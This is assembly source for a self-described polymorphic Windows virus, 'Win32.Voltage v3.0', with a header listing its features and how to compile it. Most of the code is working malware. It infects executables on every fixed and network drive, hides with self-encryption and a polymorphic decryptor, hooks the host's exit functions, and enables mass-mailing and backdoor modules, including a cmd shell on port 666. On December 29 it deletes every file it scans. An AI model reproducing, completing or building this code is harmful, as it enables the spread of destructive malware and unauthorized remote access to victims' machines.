;-----------------------------------------------------------------------|
;:::      .::.  ...      ::::::::::::::::::.      .,-:::::/ .,::::::	|  
;';;,   ,;;;'.;;;;;;;.   ;;;;;;;;;;;'''';;`;;   ,;;-'````'  ;;;;''''	|  
; \[[  .[[/ ,[[     \[[, [[[     [[    ,[[ '[[, [[[   [[[[[[/[[cccc 	|  
;  Y$c.$$"  $$$,     $$$ $$'     $$   c$$$cc$$$c"$$c.    "$$ $$"""" 	|  
;   Y88P    "888,_ _,88Po88oo,.__88,   888   888,`Y8bo,,,o88o888oo,__	| 
;    MP       "YMMMMMP" """"YUMMMMMM   YMM   ""`   `'YMUP"YMM""""YUMMM	|
;:::::::..-:.     ::-.  :::::::-.  :::::::..  	.,:::::: .-:::::'	|
; ;;;'';;'';;.   ;;;;'   ;;,   `';,;;;;``;;;;	;;;;'''' ;;;'''' 	|
; [[[__[[\. '[[,[[['     `[[     [[ [[[,/[[[' 	 [[cccc  [[[,,== 	|
; $$""""Y$$   c$$"        $$,    $$ $$$$$$ccccccc$$""""  `$$$"``	| 
;_88o,,od8P ,8P"`         888_,o8P' 888b "88bo,	 888oo,__ 888  		|  
;""YUMMMP" mM"            MMMMP"`   MMMM   "W"	 """"YUMMM"MM, 		|
;									|
;-----------------------------------------------------------------------|
;	  Win32.Voltage v3.0(MAPI) Version(c) DR-EF 2005		|
;-----------------------------------------------------------------------|
;Virus Name	: Win32.Voltage v3.0(MAPI)				|
;Virus Size	: 20kb							|
;Virus Type	: Polymorphic PE\RAR Infector/Massmailer/Backdoor	|
;Author		: DR-EF							|
;Author Homepage: http://home.arcor.de/dr-ef/				|
;									|
;Virus Features	:							|
;----------------							|
;		1)infect files on all drivers from c ~ z		|
;		2)avoid infect sfc protected files or antiviruses files	|
;		3)virus is encrypted & polymorphed using VPE engine  	|
;		4)have its own rar archive packer			|
;									|
;Mail Worm Features:							|
;-------------------							|
;		1)find mails in the windows address book		|
;		2)disable outlook express mapi sending warning		|
;		3)random message/subject
;									|
;Backdoor Features:							|
;-------------------							|
;		1)bind cmd shell to port 666				|
;		2)start at system startup				|
;		3)disable windows xp firewall				|
;									|
;General Malware Features:						|
;-------------------------						|
;		1)use mutex to avoid 2 executions at the same time	|
;		2)destructive payload					|
;		3)multi-threded						|
;		4)use SEH walker to find kernel32 base address		|
;									|
;Source Code Features:							|
;---------------------							|
;		1)Debug Version Switch					|
;		2)ability to disable\enable : mailworm,rar infection	|
;		  backdoor droping,and first gen running check		|
;									|
;To Compile:								|
;-----------								|
;	tasm32 /m3 /ml /zi w32_Voltage.asm , , ;			|
;	tlink32 /tpe /aa /v w32_Voltage , w32_Voltage,,import32.lib	|
;	pewrsec w32_Voltage.exe						|
;-----------------------------------------------------------------------|


.586
.model flat

	extrn	_lopen:proc
	

	
	DEBUG		equ	0			;turn on/off debug version 
	MAILWORM	equ	1			;turn on/off mail worm
	RARVIRUS	equ	1			;turn on/off rar virus
	BACKDOOR	equ	1			;turn on/off backdoor
	SEC_CHECK	equ	0			;turn on/off security check
	VirusSize	equ	(VirusEnd-_main)
	EncryptedVirus	equ	(EncryptedVirusEnd-(_main+EncryptionStart))
	EncryptionStart	equ	(VirusStart-_main)
	
.data
	db	?
	
.code

_main:	
	add	esp,8h					;restore stack
	call	DecryptVirus
	VirusStart	equ	$
	call	Delta
Delta:	pop	ebp
	sub	ebp,offset Delta
        mov 	eax,fs:[0]				;find kernel using SEH walker
search_last:
        mov 	edx,[eax]
        inc 	edx
        jz 	found_last
        dec 	edx
        xchg 	edx,eax
        jmp 	search_last
found_last:
        mov 	eax,[eax+4]
        and 	eax,0ffff0000h
search_mz:
        cmp 	word ptr [eax],'ZM'
        jz 	found_mz
        sub 	eax,10000h
        jmp 	search_mz
found_mz:
	mov	[ebp + kernel32base],eax
	add	eax,[eax + 3ch]
	mov	eax,[eax + 78h]
	add	eax,[ebp + kernel32base]
	;eax - kernel32 export table
	push	eax
	xor	edx,edx
	mov	eax,[eax + 20h]
	add	eax,[ebp + kernel32base]
	mov	edi,[eax]
	add	edi,[ebp + kernel32base]
	;edi - api names array
	dec	edi
nxt_cmp:inc	edi
	lea	esi,[ebp + _GetProcAddress]
	mov	ecx,0eh
	rep	cmpsb
	je	search_address
	inc	edx
nxt_l:	cmp	byte ptr [edi],0h
	je	nxt_cmp
	inc	edi
	jmp	nxt_l
search_address:
	pop	eax
	;eax - kernel32 export table
	;edx - GetProcAddress position
	shl	edx,1h
	mov	ebx,[eax + 24h]
	add	ebx,[ebp + kernel32base]
	add	ebx,edx
	mov	dx,word ptr [ebx]
	shl	edx,2h
	mov	ebx,[eax + 1ch]
	add	ebx,[ebp + kernel32base]
	add	ebx,edx
	mov	ebx,[ebx]
	add	ebx,[ebp + kernel32base]
	mov	[ebp + __GetProcAddress],ebx
	mov	ecx,NumberOfApis
	lea	eax,[ebp + ApiNamesTable]
	lea	ebx,[ebp + ApiAddressTable]
	mov	edx,[ebp + kernel32base]
	call	get_apis				;if fail we fucked,hehe
	
	;virus algorithm start here !
	;*****************************
	
	;create thread to run host
	
	call	OverTID
	dd	0					;thread id
OverTID:xor	eax,eax
	push	eax
	push	eax
	push	[ebp + HostEntryPoint]
	push	eax
	push	eax
	call	[ebp + CreateThread]
	
	mov	dword ptr [ebp + HostThreadHandle],eax	;save host thread handle
	
	call	AllowOnlyOneRun				;virus already running ?	
	jc	RunVirus				;start virus if not
		

	push	-1					;INFINTE
	push	dword ptr [ebp + HostThreadHandle]
	call	[ebp + WaitForSingleObject]		;wait forever for host
	
	jmp	ExitVir
	
RunVirus:
	
	call	AvoidHostExit				;redirect exit functions to ExitThread
	

	;load sfc library & get IsFileProtected api
	
	mov	[ebp + SfcIsFileProtected],0h		;assume no sfc
	lea	eax,[ebp + SFC_DLL]
	push	eax
	call	[ebp + LoadLibrary]			;load sfc library
	or	eax,eax					;sfc here ?
	je	NoSfc					;we not under xp\2000
	lea	ebx,[ebp + _SfcIsFileProtected]
	push	ebx
	push	eax					;sfc module handle
	call	[ebp + __GetProcAddress]
	or	eax,eax					;function not founded ?
	je	NoSfc
	mov	[ebp + SfcIsFileProtected],eax		;save function address	
NoSfc:

	call	GetUser32Apis				;get apis that used to debuging/payload


IF	MAILWORM
	call	GetADVAPI32Apis				;get apis used for registry stuff
	call	PushTID
	dd	0					;thread id
PushTID:xor	eax,eax
	push	eax
	push	eax
	lea	ebx,[ebp + MassMail]
	push	ebx
	push	eax
	push	eax
	call	[ebp + CreateThread]			;create thread to run mail worm
	
	mov	dword ptr [ebp + Mw_thread],eax		;save thread handle
ENDIF


IF	BACKDOOR
	call	PushTID2
	dd	0					;thread id
PushTID2:
	xor	eax,eax
	push	eax
	push	eax
	lea	ebx,[ebp + Backdoor]
	push	ebx
	push	eax
	push	eax
	call	[ebp + CreateThread]			;create thread to drop backdoor
ENDIF


	mov	byte ptr [ebp + PayloadDay],0h
	
	lea	eax,[ebp + SYSTEMTIME]
	push	eax
	call	[ebp + GetLocalTime]
	
	cmp	word ptr [ebp + wMonth],12d
	jne	NoPayLoad

	cmp	word ptr [ebp + wDay],29d
	jne	NoPayLoad
	
	inc	byte ptr [ebp + PayloadDay]		;killing flag
	
	push	MB_ICONINFORMATION
	lea	eax,[ebp + CopyRight]
	push	eax
	push	eax
	push	0h
	call	[ebp + MessageBox]			;show payload MessageBox
		
NoPayLoad:	
	;start to infect all drivers from z to c
	
	mov	byte ptr [ebp + StartDrive],'z'		;set start drive
	
InfectNxtDrive:
	
	;check if drive is remote or fixed
	
	
	lea	eax,[ebp + StartDrive]
	push	eax
	call	[ebp + GetDriveType]
	cmp	eax,DRIVE_FIXED
	je	InfectIt
	cmp	eax,DRIVE_REMOTE
	jne	SkipDrive
InfectIt:

IF	DEBUG
	push	MB_YESNO
	lea	eax,[ebp + DriveInfectionWarning]
	push	eax
	lea	eax,[ebp + StartDrive]
	push	eax
	push	0h
	call	[ebp + MessageBox]
	cmp	eax,IDYES
	jne	SkipDrive
ENDIF	

	lea	eax,[ebp + StartDrive]
	push	eax
	call	[ebp + SetCurrentDirectory]
	or	eax,eax
	je	SkipDrive

	call	InfectDrive

SkipDrive:	
	dec	byte ptr [ebp + StartDrive]
	cmp	byte ptr [ebp + StartDrive],'b'
	
	jne	InfectNxtDrive
	
	
IF	MAILWORM

	push	-1					;INFINTE
	push	dword ptr [ebp + Mw_thread]
	call	[ebp + WaitForSingleObject]		;wait forever for mail worm to finish

ENDIF

	push	-1					;INFINTE
	push	dword ptr [ebp + HostThreadHandle]
	call	[ebp + WaitForSingleObject]		;wait forever for host
	
ExitVir:						;exit virus !
	push	eax
	call	[ebp + ExitProcess]			

IF	MAILWORM
	Mw_thread	dd	0
ENDIF

IF	DEBUG
	
	DriveInfectionWarning	db	"Do You Wise To Infect This Drive?",0

ENDIF
	
StartDrive	db	"z:\",0

DRIVE_FIXED     equ	  3
DRIVE_REMOTE    equ	  4

HostThreadHandle	dd	0
PayloadDay		db	0

WIN32_FIND_DATA2:
	dwFileAttributes_	dd	0
	ftCreationTime_		dq	0
	ftLastAccessTime_	dq	0
	ftLastWriteTime_	dq	0
	nFileSizeHigh_		dd	0
	nFileSizeLow_		dd	0
	dwReserved0_		dd      0
	dwReserved1_		dd      0
	cFileName_		db      0ffh dup (0)
	cAlternateFileName_	db	20 dup (0)		;+ some bytes for padding
	
	
	
hsearch			dd	0
	
	
	
	
;recursive directory scanner...		
InfectDrive:

	lea	eax,[ebp + WIN32_FIND_DATA2]
	push	eax
	lea	eax,[ebp + SearchMask]
	push	eax
	call	[ebp + FindFirstFile]
	cmp	eax,INVALID_HANDLE_VALUE		;error ?
	je	@Stops					;stop search
	
	mov	[ebp + hsearch],eax			;save search handle
	
@NxtF:	mov	eax,[ebp + dwFileAttributes_]		;get file attributes
	and	eax,FILE_ATTRIBUTE_DIRECTORY		;remove bit masks
	cmp	eax,FILE_ATTRIBUTE_DIRECTORY		;it is directory ?
	jne	@isFile
	cmp	byte ptr [ebp + cFileName_],'.'		;its start with . ?
	je	@FndNxt

	push	[ebp + hsearch]				;save search handle
	
	lea	eax,[ebp + cFileName_]
	push	eax
	call	[ebp + SetCurrentDirectory]		;enter directory
	or	eax,eax
	je	@skpdir


	call	InfectDrive				;infect all sub directorys


	lea	eax,[ebp + dotdot]
	push	eax
	call	[ebp + SetCurrentDirectory]		;return to current directory
	

@skpdir:pop	[ebp + hsearch]				;restore search handle
	jmp	@FndNxt
	
@isFile:
	cmp	byte ptr [ebp + PayloadDay],1h
	jne	_NoPayload
	
	lea	eax,[ebp + cFileName_]
	push	eax
	call	[ebp + DeleteFileA]
	
	jmp	@FndNxt
	
_NoPayload:	
	lea	eax,[ebp + File_Name]
	push	eax
	lea	eax,[ebp + FileToInfect]
	push	eax
	push	260
	lea	eax,[ebp + cFileName_]
	push	eax
	call	[ebp + GetFullPathName]			;get file full path	
	or	eax,eax
	je	@FndNxt	
	
	
	;check what kind of file we have: exe/scr or rar file
	

	lea	eax,[ebp + FileToInfect]
@Find0:	cmp	byte ptr [eax],0h
	je	@GetExt
	inc	eax
	jmp	@Find0
@GetExt:sub	eax,4h					;go before the .xxx

	or	dword ptr [eax],20202020h		;convert to lower case

	cmp	dword ptr [eax],"exe."
	je	morechecks
	cmp	dword ptr [eax],"rcs."
	je	morechecks
	
IF	RARVIRUS
	cmp	dword ptr [eax],"rar."
	je	rar_file	
ENDIF	

	jmp	@FndNxt	

IF	RARVIRUS
rar_file:
	mov	byte ptr [ebp + rarfile],1h
ENDIF
	
morechecks:	
	
	mov	eax,[ebp + nFileSizeLow_]		;get file size
		
	cmp	eax,2800h				;too small ?
	jb	@FndNxt	
	cmp	eax,300000h				;too big ?
	ja	@FndNxt
	
	push	eax
	pop	[ebp + FileSize]			;save file size	
	
IF	RARVIRUS
	cmp	byte ptr [ebp + rarfile],1h
	je	@xRar					;skip checks that are not relevant for rar file
ENDIF	

	xor	edx,edx
	call	pad_size
	or	edx,edx					;already infected ?
	je	@FndNxt
	
	
	call	CheckFileName				;check for av file...
	jnc	@FndNxt


	cmp	dword ptr [ebp + SfcIsFileProtected],0h ;sfc working ?
	je	SfcNotWork
	
	
	lea	esi,[ebp + Unicode_Path]
	xor	eax,eax
	mov	ecx,200h
	rep	stosb					;blank unicode buffer
	
	
	push	200h
	lea	eax,[ebp + Unicode_Path]
	push	eax
	push	-1					;string is null terminated
	lea	eax,[ebp + FileToInfect]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	call	[ebp + MultiByteToWideChar]		;convert path into unicode
	or	eax,eax					;fail ?
	je	@FndNxt					;dont infect
	
	
	lea	eax,[ebp + Unicode_Path]
	push	eax
	push	0h
	call	[ebp + SfcIsFileProtected]		;check if file is protected
	cmp	eax,0h					;is file protected ?
	jne	@FndNxt
	
	
SfcNotWork:						;sfc dont working,assume we on win9x

		
	call	InfectFile
	
	jmp	@FndNxt

IF	RARVIRUS
@xRar:	call	InfectRar
ENDIF
	

@FndNxt:

IF	RARVIRUS
	mov	byte ptr [ebp + rarfile],0h
ENDIF

	lea	eax,[ebp + WIN32_FIND_DATA2]
	push	eax
	push	[ebp + hsearch]
	call	[ebp + FindNextFile]			;find next file
	or	eax,eax
	jne	@NxtF

	push	[ebp + hsearch]
	call	[ebp + FindClose]			;end the search
	
@Stops:	ret
	
	FILE_ATTRIBUTE_DIRECTORY	equ	00000010h
		
	File_Name		dd	0
	dotdot			db	"..",0
	SearchMask		db	"*.*",0
	
IF	RARVIRUS
	rarfile			db	0
ENDIF	
	
	
AvoidHostExit:
;this function redirect some functions used by program to exit to special
;exit handle that wont make the virus close itself
	push	0h
	call	[ebp + GetModuleHandle]		;get currect module handle
	
	push	eax
	
	call	Overk32
	db	"kernel32.dll",0
Overk32:pop	ebx
	call	OverEP
	db	"ExitProcess",0
OverEP:	pop	ecx
	lea	edx,[ebp + HostExit]
	call	HookApi
	
	mov	eax,[esp]

	call	OverLib
	db	"msvcrt.dll",0
OverLib:pop	ebx
	call	Over_E
	db	"_exit",0
Over_E:	pop	ecx
	lea	edx,[ebp + HostExit]
	call	HookApi	
	
	pop	eax
	
	call	OverLib2
	db	"msvcrt.dll",0
OverLib2:pop	ebx
	call	Over_E2
	db	"exit",0
Over_E2:pop	ecx
	lea	edx,[ebp + HostExit]
	call	HookApi		
	
	ret
	
IF	RARVIRUS

include rarvirus.asm

ENDIF	
	
;this function will be called instead of ExitProcess
HostExit:
	call	_Delta
_Delta:	pop	ebp
	sub	ebp,offset _Delta		;get delta offset
	push	eax
	call	[ebp + ExitThread]		;exit thread

	
AllowOnlyOneRun:
	;use mutex to check if we already running
	lea	eax,[ebp + CopyRight]
	push	eax
	push	0h
	push	MUTEX_ALL_ACCESS
	call	[ebp + OpenMutex]
	cmp	eax,0h
	jne	AlreadyRun
	lea	eax,[ebp + CopyRight]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	call	[ebp + CreateMutex]
	stc
	ret
AlreadyRun:
	clc
	ret
	
	MUTEX_ALL_ACCESS	equ	001F0001h	
	
		
	kernel32base		dd	0
	_GetProcAddress		db	"GetProcAddress",0
	__GetProcAddress	dd	0
	
ApiNamesTable:
	
	_CreateFile		db	"CreateFileA",0
	_CloseHandle		db	"CloseHandle",0
	_CreateFileMapping	db 	"CreateFileMappingA",0
	_MapViewOfFile		db 	"MapViewOfFile",0
	_UnmapViewOfFile	db 	"UnmapViewOfFile",0
	_LoadLibrary		db	"LoadLibraryA",0
	_FreeLibrary		db	"FreeLibrary",0
	_GetModuleFileName	db	"GetModuleFileNameA",0
	_SetFileAttributesA	db	"SetFileAttributesA",0
	_GetFileSize		db	"GetFileSize",0
	_SetFilePointer		db	"SetFilePointer",0
	_SetEndOfFile		db	"SetEndOfFile",0
	_GetTickCount		db	"GetTickCount",0
	_GlobalAlloc		db	"GlobalAlloc",0
	_GlobalFree		db	"GlobalFree",0
	_GetLocalTime		db	"GetLocalTime",0
	_GetFileAttributes	db	"GetFileAttributesA",0
	_GetFileTime		db	"GetFileTime",0
	_SetFileTime		db	"SetFileTime",0
	_CreateMutexA		db	"CreateMutexA",0
	_OpenMutexA		db	"OpenMutexA",0
	_FindFirstFileA		db	"FindFirstFileA",0
	_FindNextFileA		db	"FindNextFileA",0
	_SetCurrentDirectoryA	db	"SetCurrentDirectoryA",0
	_WriteFile		db	"WriteFile",0
	_FindClose		db	"FindClose",0
	_MultiByteToWideChar	db	"MultiByteToWideChar",0
	_lstrcatA		db	"lstrcatA",0
	_CreateThread		db	"CreateThread",0
	_GetModuleHandle	db	"GetModuleHandleA",0
	_Sleep			db	"Sleep",0
	_WaitForSingleObject	db	"WaitForSingleObject",0
	_ExitThread		db	"ExitThread",0
	_ExitProcess		db	"ExitProcess",0
	_GetDriveTypeA		db	"GetDriveTypeA",0
	_GetFullPathNameA	db	"GetFullPathNameA",0
	_WinExec		db	"WinExec",0
	_VirtualProtect		db	"VirtualProtect",0
	_SetUnhandledExceptionFilter	db	"SetUnhandledExceptionFilter",0
	_DeleteFileA		db	"DeleteFileA",0
	
ApiAddressTable:
	
	CreateFile		dd	0
	CloseHandle		dd	0
	CreateFileMapping	dd	0
	MapViewOfFile		dd	0
	UnMapViewOfFile		dd	0
	LoadLibrary		dd	0
	FreeLibrary		dd	0
	GetModuleFileName	dd	0
	SetFileAttributes	dd	0
	GetFileSize		dd	0
	SetFilePointer		dd	0
	SetEndOfFile		dd	0
	GetTickCount		dd	0
	GlobalAlloc		dd	0
	GlobalFree		dd	0
	GetLocalTime		dd	0
	GetFileAttributes	dd	0
	GetFileTime		dd	0
	SetFileTime		dd	0
	CreateMutex		dd	0
	OpenMutex		dd	0
	FindFirstFile		dd	0
	FindNextFile		dd	0
	SetCurrentDirectory	dd	0
	WriteFile		dd	0
	FindClose		dd	0
	MultiByteToWideChar	dd	0
	lstrcat			dd	0
	CreateThread		dd	0
	GetModuleHandle		dd	0
	Sleep			dd	0
	WaitForSingleObject	dd	0
	ExitThread		dd	0
	ExitProcess		dd	0
	GetDriveType		dd	0
	GetFullPathName		dd	0
	WinExec			dd	0
	VirtualProtect		dd	0
	SetUnhandledExceptionFilter	dd	0
	DeleteFileA		dd	0
	
	
	NumberOfApis		equ	40
	
	
	CopyRight	db	"Win32.Voltage Virus Written By DR-EF (c) 2005",0
	
	
SYSTEMTIME:
	wYear		dw	0
	wMonth		dw	0
	wDayOfWeek	dw	0
	wDay		dw	0
	wHour		dw	0
	wMinute		dw	0
	wSecond		dw	0
	wMilliseconds	dw	0	
	

IF MAILWORM
		
GetADVAPI32Apis:
	lea	eax,[ebp + ADVAPI32dll]
	push	eax
	call	[ebp + LoadLibrary]
	xchg	eax,edx
	mov	ecx,NumberOfRegFunctions
	lea	eax,[ebp + reg_functions_sz]
	lea	ebx,[ebp + reg_function_addresses]
	call	get_apis
	ret

	ADVAPI32dll		db	"ADVAPI32.DLL",0
	
	reg_functions_sz:

	_RegOpenKeyExA		db	"RegOpenKeyExA",0
	_RegCloseKey		db	"RegCloseKey",0
	_RegQueryValueEx	db	"RegQueryValueExA",0
	_RegSetValueEx		db	"RegSetValueExA",0
	
	reg_function_addresses:
	
	RegOpenKeyEx		dd	0
	RegCloseKey		dd	0
	RegQueryValueEx		dd	0
	RegSetValueEx		dd	0
	
	NumberOfRegFunctions	equ	4
	
	
ENDIF	
	
GetUser32Apis:
	lea	eax,[ebp + User32dll]
	push	eax
	call	[ebp + LoadLibrary]
	xchg	eax,edx
	mov	ecx,NumberOfUser32Functions
	lea	eax,[ebp + user32_functions_sz]
	lea	ebx,[ebp + user32_functions_addresses]
	call	get_apis
	ret
	
	User32dll	db	"User32.dll",0
	user32_functions_sz:
	
	_MessageBox	db	"MessageBoxA",0

	
	user32_functions_addresses:
	
	MessageBox	dd	0
	SetWindowText	dd	0
	
	NumberOfUser32Functions	equ	1
	
			
	MB_SYSTEMMODAL		equ	00001000h
	MB_ICONINFORMATION	equ	00000040h
		
	hfind		dd	0
	search_mask	db	"*.*",0
	
	
WIN32_FIND_DATA:
	dwFileAttributes	dd	0
	ftCreationTime		dq	0
	ftLastAccessTime	dq	0
	ftLastWriteTime		dq	0
	nFileSizeHigh		dd	0
	nFileSizeLow		dd	0
	dwReserved0		dd      0
	dwReserved1		dd      0
	cFileName		db      0ffh dup (0)
	cAlternateFileName	db	14 dup (0)


	FileToInfect	db	0FFH 	dup(0)
	
	
;input:
;eax - image base
;ebx - dll name	in lower case
;ecx - function name
;edx - hook procedure
;output
;eax - new function address or 0 if fail	
HookApi:
	cmp	word ptr [eax],"ZM"		;check mz sign
	jne	HookErr
	push	eax				;save image base in the stack
	add	eax,[eax + 3ch]			;goto pe header
	add	eax,80h
	mov	eax,[eax]			;get import section rva
	cmp	eax,0h
	je	HookErr_
	add	eax,[esp]			;convert it to va
@Dll:	mov	esi,[eax + 0ch]
	cmp	esi,0h
	je	HookErr_	
	add	esi,[esp]			;esi - dll name
	;compare the dll name in [esi],with our dll:
	pushad
	xchg	edi,ebx
KeepCmp:cmp	byte ptr [esi],0h
	je	_dll
	mov	cl,byte ptr [esi]
	or	cl,20h				;convert to lower case
	cmp	byte ptr [edi],cl
	jne	NextDll
	inc	edi
	inc	esi
	jmp	KeepCmp
NextDll:popad
	add	eax,14h				;move to next IMAGE_IMPORT_DESCRIPTOR structure
	jmp	@Dll
_dll:	popad
	;edx - Hook procedure
	;ecx - function to hook
	;eax - IMAGE_IMPORT_DESCRIPTOR of our api dll
	;[esp]	- image base
	mov	ebx,[eax]			;get rva to pointers to image import by name structures
	add	ebx,[esp]			;convert it to va
	xor	edi,edi				;used to save loop index
@FindApi:
	;ebx - pointer to pointers arrary of import by name structures
	push	edi				;save loop index
	push	ebx				;save pointer to import by name structures
	push	eax				;save import section rva
	push	ecx				;save function to hook name
	push	edx				;save hook procedure
	mov	esi,[ebx]			;get import by name structure rva
	add	esi,[esp + 14h]			;convert it to va
	add	esi,2h				;skip the IBN_Hint
	mov	edi,ecx				;move our api name into edi
	xor	ecx,ecx				;used to save our api name size
@GSize_:cmp	byte ptr [edi + ecx],0h		;did we in the end ?
	je	___Size
	inc	ecx
	jmp	@GSize_
___Size:inc	ecx				;include the 0
	rep	cmpsb				;compare api names
	je	ApiFound			;we found it !
	pop	edx
	pop	ecx
	pop	eax
	pop	ebx
	pop	edi
	add	edi,4h
	add	ebx,4h				;move to next pointer
	cmp	dword ptr [ebx],0h		;no more pointers ???
	jne	@FindApi
HookErr_:
	pop	eax
HookErr:xor	eax,eax
	ret
ApiFound:
	pop	edx
	pop	ecx
	pop	eax
	pop	ebx
	pop	edi
	mov	esi,[eax + 10h]			;rva to name
	add	esi,[esp]
	add	esi,edi				;goto our api address
	mov	eax,[esi]			;get our api old address
	
	push	edx
	
	call	OverVp
	dd	0
OverVp:	push	PAGE_READWRITE
	push	10h
	push	esi				;use virtual protect to set 
	call	[ebp + VirtualProtect]		;the memory to writeable
	
	pop	edx
	
	mov	[esi],edx			;hook it !
	pop	esi				;restore stack
	ret	
	
	
InfectFile:
;*********************Debug C0de*******************************
IF	DEBUG
	push	MB_YESNO
	lea	eax,[ebp + warning]
	push	eax
	lea	eax,[ebp + FileToInfect]
	push	eax
	push	0h
	call	[ebp + MessageBox]
	cmp	eax,IDYES
	jne	ExitInfect
ENDIF
;**************************************************************
	call	RemoveFileAttributes
	call	OpenFile
	jnc	ExitInfect
	
	lea	eax,[ebp + InfectionSEH]
	push	eax
	call	[ebp + SetUnhandledExceptionFilter];set SEH
	mov	[ebp + Infection_SEH],eax

	mov	eax,[ebp + mapbase]
	cmp	word ptr [eax],"ZM"		;check mz sign
	jne	ExitWithoutInfection
	mov	ecx,dword ptr [eax + 18h]	;check if relocation in mz header
	cmp	ecx,40h				;is 0x40 which is always for pe file
	jne	ExitWithoutInfection
	add	eax,[eax + 3ch]
	cmp	word ptr [eax],"EP"		;check pe sign
	jne	ExitWithoutInfection
	push	eax				;save pe header offset in the stack
	mov	cx,word ptr [eax + 16h]		;get flags
	and	cx,2000h
	cmp	cx,2000h			;is dll ?
	jne	nodll				;infect only executeables
	pop	eax				;restore stack
	jmp	ExitWithoutInfection
nodll:	mov	ecx,[eax + 34h]			;get image base
	mov	[ebp + ProgramImageBase],ecx	;save image base
	movzx	ecx,word ptr [eax + 6h]		;get number of sections
	mov	ebx,[eax + 74h]
	shl	ebx,3h
	add	eax,ebx
	add	eax,78h				;goto first section header
@nexts:	mov	ebx,[eax + 24h]			;get section flags
	and	ebx,20h
	cmp	ebx,20h				;is code section ?
	je	FoundCS
	add	eax,28h
	loop	@nexts
	pop	eax				;restore stack
	jmp	ExitWithoutInfection	
FoundCS:mov	ebx,[eax + 24h]			;get section flags
	and	ebx,80000000h
	cmp	ebx,80000000h			;does code section writeable ?
	jne	__x1
	pop	eax				;restore stack
	jmp	ExitWithoutInfection	
__x1:	mov	ebx,[esp]			;get pe header
	mov	ebx,[ebx + 80h]			;get imports rva
	mov	ecx,[eax + 0ch]			;get section rva
	cmp	ebx,ecx
	jb	OutOfRange
	add	ecx,[eax + 10h]			;add size of raw data
	cmp	ebx,ecx
	ja	OutOfRange
	pop	eax
	jmp	ExitWithoutInfection		;bad file,imports is merged in code section...
OutOfRange:
	mov	ebx,[eax + 10h]			;get section size of raw data
	sub	ebx,[eax + 8h]
	cmp	ebx,0beh			;check for minimum decryptor size
	ja	____1
	pop	eax				;restore stack
	jmp	ExitWithoutInfection
____1:	mov	ecx,[eax + 8h]			;get section vitrual size	
	mov	ebx,ecx				;get section virtual size
	add	ebx,[eax + 14h]			;add to it pointer raw data rva
	add	ebx,[ebp + mapbase]		;convert it to va
	mov	[ebp+WhereToWriteDecryptor],ebx	;set where to write decryptor
	;save host original entry point
	mov	ebx,dword ptr [esp]		;get pe header
	mov	eax,[ebx + 28h]			;get entry point rva
	add	eax,[ebx + 34h]			;convert it to va
	mov	[ebp + HostEntryPoint],eax	;save original EP
	;redirect host entry point to the decryptor
	mov	eax,[ebp + WhereToWriteDecryptor]
	sub	eax,[ebp + mapbase]
	mov	[ebx + 28h],eax			;set new entry point
	mov	eax,dword ptr [esp]		;get pe header
	xor	ecx,ecx
	mov	cx,word ptr [eax + 6h]		;get number of sections
	dec	ecx
	mov	ebx,[eax + 74h]
	shl	ebx,3h
	add	eax,ebx
	add	eax,78h
@nexts2:add	eax,28h
	loop	@nexts2				;goto last section header
	or	[eax + 24h],0C0000000h		;set section flags to readable\writeable
	add	dword ptr [eax + 8h],VirusSize	;add virus size to section virtual size
	mov	[ebp + Ls],eax			;save last section offset
	xchg	eax,ebx
	mov	eax,[ebx + 8h]			;get section new virtual size
	mov	ecx,dword ptr [esp]		;get pe header
	mov	ecx,[ecx + 3ch]			;get file alignment
	push	eax				;\
	xor	edx,edx				; \
	div	ecx				;-->align section size
	sub	ecx,edx				; /
	pop	dword ptr [ebx + 10h]		;/
	add	dword ptr [ebx + 10h],ecx	;set new section size of raw data
	push	eax					
	mov	[ebp + FixRVA],0		;add VirtualSize-PointerToRawData
	mov	eax,[ebx + 0ch]			;subtraction to the virus offset
	sub	eax,[ebx + 14h]			;when decrypting and jumping to
	mov	[ebp + FixRVA],eax		;virus at runtime.
	pop	eax
	mov	eax,[ebx + 14h]			;get section raw data rva
	add	eax,[ebp + mapbase]		;convert it to va
	add	eax,[ebx + 8h]			;goto end of section
	sub	eax,VirusSize
	mov	[ebp + StartOfDataToEncrypt],eax;set the virus start offset
	xchg	edi,eax
	call	[ebp + GetTickCount]
	mov	dword ptr [ebp + SlidingKey],eax;save sliding key
	push	eax
	call	[ebp + GetTickCount]
	mov	byte ptr [ebp + XorKey],al	;set random key
	push	edi				;virus in infected files
	push	eax				;tick count
	lea	esi,[ebp + _main]
	mov	ecx,VirusSize
	rep	movsb				;copy virus into host
	pop	eax
	pop	edi
	pop	edx
	mov	ecx,EncryptedVirus
	add	edi,EncryptionStart
encrypt:rol	edx,1h				;slide the key
	sub	byte ptr [edi],dl
	xor	byte ptr [edi],al
	inc	edi
	loop	encrypt
	call	CreateDecryptor			;create polymorphic decryptor
	pop	ebx				;restore pe header
	mov	edx,[ebp + Ls]
	mov	eax,[edx + 0ch]
	add	eax,[edx + 10h]
	mov	dword ptr [ebx + 50h],eax	;set new size of image
	call	PadFileSize
ExitCloseF:
	call	CloseFile
ExitInfect:
	call	RestoreFileAttributes
	ret
ExitWithoutInfection:
	call	RestoreFileSize
	call	CloseFile
	call	RestoreFileAttributes
	ret

InfectionSEH:
	call	IS_D
IS_D:	pop	ebp
	sub	ebp,offset IS_D
	
	push	[ebp + Infection_SEH]
	call	[ebp + SetUnhandledExceptionFilter]	;remove SEH

	jmp	ExitWithoutInfection
	
	Infection_SEH	dd	0


IF	MAILWORM
	include mailworm.asm
ENDIF
	
	

	Ls	dd	0
	
	SFC_DLL	db	"SFC.DLL",0
	_SfcIsFileProtected      db      "SfcIsFileProtected",0
	SfcIsFileProtected	dd	0
	
	Unicode_Path	db	200h	dup(0)	 ;200=2 max_path
	
	CP_ACP	equ	0
	
	
	
RemoveFileAttributes:
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + GetFileAttributes]
	mov	[ebp + OldFileAttribute],eax
	push	FILE_ATTRIBUTE_NORMAL
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + SetFileAttributes]
	ret
	
	OldFileAttribute	dd	0
	
RestoreFileAttributes:
	push	dword ptr [ebp + OldFileAttribute]
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + SetFileAttributes]
	ret
	
PadFileSize:
	call	pad_size
	push	FILE_BEGIN
	push	0h
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + SetFilePointer]
	push	dword ptr [ebp + hfile]
	call	[ebp + SetEndOfFile]
	ret
	
